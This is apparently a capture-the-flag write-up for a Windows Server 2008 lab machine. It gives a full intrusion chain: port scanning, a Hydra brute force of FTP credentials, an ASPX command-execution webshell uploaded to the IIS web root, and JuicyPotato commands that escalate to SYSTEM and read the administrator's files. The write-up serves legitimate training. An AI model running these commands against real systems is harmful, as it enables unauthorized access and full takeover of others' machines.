# Cocido Andaluz — The Hackers Labs

## Overview

**Cocido Andaluz** is a Windows-based machine from The Hackers Labs running Microsoft Windows Server 2008 Datacenter.

The objective was to obtain initial access through the exposed services, achieve remote code execution through IIS/ASP.NET, enumerate the compromised system and escalate privileges to NT AUTHORITY\SYSTEM.

The privilege escalation was performed by abusing the SeImpersonatePrivilege privilege through JuicyPotato.

## Target Information

| Information | Value |
|---|---|
| Platform | The Hackers Labs |
| Operating System | Windows Server 2008 Datacenter |
| Architecture | x86 |
| Target IP | `10.0.2.15` |
| Initial Access | FTP credentials |
| RCE | ASP.NET upload |
| Privilege Escalation | JuicyPotato |
| Final Privilege | `NT AUTHORITY\SYSTEM` |
| Status | Completed |

## 1. Host Discovery

As the target IP was initially unknown, host discovery was performed against the local network:

```bash
sudo nmap -sn 10.0.2.0/24

The -sn option performs host discovery without performing a port scan.

The target was identified as:

10.0.2.15
```
## 2. Port Enumeration

A full TCP port scan was performed:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.0.2.15 -oN allports
```
The relevant exposed services were:
```bash
21/tcp     open  ftp
80/tcp     open  http
135/tcp    open  msrpc
139/tcp    open  netbios-ssn
445/tcp    open  microsoft-ds
49152/tcp  open  msrpc
49153/tcp  open  msrpc
49154/tcp  open  msrpc
49155/tcp  open  msrpc
49156/tcp  open  msrpc
49157/tcp  open  msrpc
49158/tcp  open  msrpc
```
A targeted scan was then performed:
```bash
nmap -p 21,80,135,139,445,49152-49158 -sCV 10.0.2.15 -oN targeted
```
The HTTP service was identified as:
```text
Microsoft IIS httpd 7.0
```
while FTP was identified as:
```text
Microsoft FTP Service
```
## 3. FTP Enumeration

The first step was testing anonymous FTP access:
```bash
ftp 10.0.2.15
```
Credentials:
```text
Username: anonymous
Password: [Enter]
```
Anonymous authentication was rejected.

Since FTP was exposed and no valid credentials were available yet, the other services were investigated.

## 4. SMB and RPC Enumeration

SMB was investigated using NetExec:
```bash
netexec smb 10.0.2.15
```
Share enumeration:
```bash
netexec smb 10.0.2.15 --shares
```
Null session authentication was also tested:
```bash
rpcclient -U "" 10.0.2.15 -N
```
No useful anonymous access was obtained.

WinRM was also considered for potential use with valid credentials:
```bash
netexec winrm 10.0.2.15 -u usuario -p 'contraseña'
```
At this stage, SMB and RPC did not provide a useful attack path.

## 5. Web Enumeration

The HTTP service was inspected using several tools.

Headers:

curl -I http://10.0.2.15:80

Technology fingerprinting:

whatweb http://10.0.2.15

Directory enumeration:

gobuster dir -u http://10.0.2.15 -w /usr/share/wordlists/dirb/big.txt -x php,txt,bak,old

The web server presented a default page.

A wildcard response was also identified during directory enumeration. Responses with the same content length could therefore be excluded using:

--exclude-length 10701

No immediately exploitable functionality was identified through the initial web enumeration.

## 6. FTP Credential Brute Force

Since FTP remained exposed and the other enumeration paths had not produced useful access, a small username list was created based on usernames observed during enumeration:

Administrador
administrador
Administrator
administrator
info
Info

Hydra was then used against FTP:

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.0.2.15

Valid credentials were obtained for the info account.

The password is omitted from this public write-up.

The credentials were then tested manually through FTP.

## 7. FTP File Access

After authentication:

ftp 10.0.2.15

the remote directory contained the website files.

The existing index.html was downloaded:

get index.html

Its contents matched the page accessible through the browser.

This indicated that the FTP directory corresponded to the IIS web root.

Testing File Upload

A harmless text file was created:

echo "test de subida" > test.txt

and uploaded:

put test.txt

The uploaded file was then requested through HTTP:

curl http://10.0.2.15/test.txt

The file was accessible through the web server.

This confirmed that the FTP account had write access to the IIS web root.

## 8. ASP.NET File Upload

The next step was determining which server-side technologies IIS would process.

An ASP test file was created:

echo '<% Response.Write("Mora ASP test"); %>' > test.asp

The server did not process the ASP file as expected.

An ASP.NET file was then created:

echo '<%@ Page Language="C#" %><% Response.Write("Mora ASPX test"); %>' > test.aspx

The file was successfully processed by IIS.

This confirmed that uploaded .aspx files were being interpreted as ASP.NET code.

## 9. ASP.NET Remote Code Execution

A simple ASPX payload was created to execute cmd.exe:

<%@ Page Language="C#" %>

<%
System.Diagnostics.Process p = new System.Diagnostics.Process();

p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c whoami";
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;

p.Start();

Response.Write(p.StandardOutput.ReadToEnd());
%>

After uploading the file and accessing it through HTTP, the response was:

nt authority\servicio de red

This confirmed remote code execution.

The ASP.NET worker process was executing under:

NT AUTHORITY\NETWORK SERVICE
## 10. ASPX Command Console

For easier enumeration, a small ASPX command console was created.

The console accepted commands through an HTTP POST request and executed them through cmd.exe.

This allowed commands such as:

whoami
whoami /groups
whoami /priv
systeminfo
net localgroup

to be executed without repeatedly uploading new ASPX files.

## 11. Windows Enumeration

The current identity was:

whoami

Result:

nt authority\servicio de red

Group enumeration:

whoami /groups

Privilege enumeration:

whoami /priv

One privilege was particularly interesting:

SeImpersonatePrivilege    Habilitada

System information was also collected:

systeminfo

The target was identified as:

Microsoft Windows Server 2008 Datacenter
X86-based PC

The combination of:

NETWORK SERVICE
+
SeImpersonatePrivilege

suggested investigating token impersonation techniques such as the Potato family.

## 12. JuicyPotato

Because the target was an x86 Windows system, an x86 version of JuicyPotato was used.

The binary was verified from Kali:

file Juicy.Potato.x86.exe

Result:

PE32 executable ... Intel i386

PE32 indicates a 32-bit Windows executable, matching the target architecture.

A PE32+ executable would correspond to x64 and would not be appropriate for this target.

The binary was uploaded through FTP.

FTP Binary Mode

When transferring executable files through FTP, binary mode must be used:

binary

followed by:

put Juicy.Potato.x86.exe

Using ASCII mode can alter binary files during transfer.

The executable was placed at:

C:\inetpub\wwwroot\Juicy.Potato.x86.exe

The executable was then tested:

C:\inetpub\wwwroot\Juicy.Potato.x86.exe -h
## 13. CLSID Validation

JuicyPotato uses Windows COM components identified by CLSID (Class Identifier).

The JuicyPotato help output showed the following BITS CLSID as the default:

{4991d34b-80a1-4291-83b6-3328366b9097}

The -c option allows specifying a CLSID:

-c <{clsid}>

The -z option can be used to test the CLSID and display the user associated with the obtained token.

The following command was used:

C:\inetpub\wwwroot\Juicy.Potato.x86.exe -z -t * -p C:\Windows\System32\cmd.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}

The result was:

{4991d34b-80a1-4291-83b6-3328366b9097;NT AUTHORITY\SYSTEM

This confirmed that the CLSID could provide a token associated with:

NT AUTHORITY\SYSTEM
## 14. Privilege Escalation

The CLSID was then used to create a new process with the obtained token.

A simple whoami proof was performed:

C:\inetpub\wwwroot\Juicy.Potato.x86.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\inetpub\wwwroot\system.txt" -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}

The resulting file was read through the webshell:

type C:\inetpub\wwwroot\system.txt

Result:

nt authority\system

This confirmed successful privilege escalation.

Important distinction

The original ASP.NET webshell remained:

NT AUTHORITY\NETWORK SERVICE

JuicyPotato did not transform the existing webshell into SYSTEM.

Instead, it created a separate process:

NETWORK SERVICE
       ↓
JuicyPotato
       ↓
SYSTEM token
       ↓
new cmd.exe
       ↓
NT AUTHORITY\SYSTEM

This distinction became important during post-exploitation because commands executed directly through the webshell still had the permissions of NETWORK SERVICE.

## 15. Accessing the Administrator Profile

Direct access from the webshell:

dir C:\Users\Administrador /a

resulted in:

Access Denied

The same operation was then executed through the SYSTEM process created by JuicyPotato:

C:\inetpub\wwwroot\Juicy.Potato.x86.exe -t * -p C:\Windows\System32\cmd.exe -a "/c dir C:\Users\Administrador /a > C:\inetpub\wwwroot\admin-system.txt" -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}

The resulting file showed the contents of:

C:\Users\Administrador

including:

Desktop
Documents
Downloads
...

This further demonstrated the difference between the privileges of the webshell and the SYSTEM process.

## 16. Root Flag

The root flag was located at:

C:\Users\Administrador\Desktop\root.txt

Because the webshell itself was still running as NETWORK SERVICE, the file could not be read directly.

The SYSTEM process created through JuicyPotato was therefore used to read it:

C:\inetpub\wwwroot\Juicy.Potato.x86.exe -t * -p C:\Windows\System32\cmd.exe -a "/c type C:\Users\Administrador\Desktop\root.txt > C:\inetpub\wwwroot\rootflag.txt" -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}

The result was then retrieved from the webshell:

type C:\inetpub\wwwroot\rootflag.txt

The root flag was successfully obtained.

Attack Chain
Host Discovery
      ↓
10.0.2.15
      ↓
Nmap Enumeration
      ↓
FTP / HTTP / SMB / RPC
      ↓
FTP Brute Force
      ↓
info credentials
      ↓
FTP Write Access
      ↓
ASPX Upload
      ↓
ASP.NET RCE
      ↓
NETWORK SERVICE
      ↓
SeImpersonatePrivilege
      ↓
JuicyPotato
      ↓
CLSID / BITS
      ↓
SYSTEM Token
      ↓
New cmd.exe as SYSTEM
      ↓
Administrator Profile
      ↓
root.txt
Lessons Learned
FTP write access can be more important than anonymous access

Although anonymous FTP was disabled, authenticated FTP access provided write access to the IIS web root. This transformed the FTP service into the initial access vector.

Always test what uploaded files are actually processed

The important discovery was not simply that FTP allowed uploads, but that uploaded .aspx files were interpreted by IIS as ASP.NET code.

RCE does not mean administrator access

The initial RCE executed as:

NT AUTHORITY\NETWORK SERVICE

Further enumeration was required to determine the available privileges.

SeImpersonatePrivilege is an important Windows privilege

The combination of:

NETWORK SERVICE
+
SeImpersonatePrivilege

provided the clue toward Potato-style privilege escalation.

Architecture matters

The target was:

X86-based PC

so the appropriate JuicyPotato binary was:

PE32 / Intel i386

rather than:

PE32+
FTP binary mode matters

Executable files should be transferred using:

binary

rather than ASCII mode.

A privileged token does not change the existing shell

JuicyPotato created a separate process running as SYSTEM.

The original ASPX webshell remained NETWORK SERVICE.

Validate exploitation in stages

Instead of immediately attempting to obtain a full shell, the CLSID was first validated using:

-z

and the resulting token was confirmed as:

NT AUTHORITY\SYSTEM

Only after validating the mechanism was the process execution performed.

Conclusion

Cocido Andaluz was completed by chaining authenticated FTP access with write permissions to the IIS web root, uploading an ASP.NET file and obtaining RCE as NETWORK SERVICE.

The presence of SeImpersonatePrivilege provided the path to privilege escalation. JuicyPotato was then used with a compatible CLSID to obtain a SYSTEM token and create a new cmd.exe process with SYSTEM privileges.

The final attack path was:

FTP Credentials
      ↓
FTP Write Access
      ↓
ASP.NET RCE
      ↓
NETWORK SERVICE
      ↓
SeImpersonatePrivilege
      ↓
JuicyPotato
      ↓
SYSTEM
      ↓
Root Flag

Machine completed.

References
The Hackers Labs
JuicyPotato — ohpe/juicy-potato